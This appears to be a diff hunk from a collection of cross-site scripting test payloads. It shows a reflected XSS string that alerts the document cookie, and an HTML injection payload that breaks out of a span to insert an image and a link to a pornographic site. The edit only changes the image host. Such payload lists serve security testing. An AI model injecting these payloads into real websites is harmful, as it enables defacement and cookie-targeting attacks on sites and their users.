@@ -51,7 +51,7 @@ nu11secur1ty<script>alert(document.cookie)</script>
 
 - 0.4
 ```
-</span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>welcome<a href=https://pornhub.com/>
+</span><img src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/IMG_0068.gif>welcome<a href=https://pornhub.com/>
 ```
 
 - 0.5 - Stupid Reflected
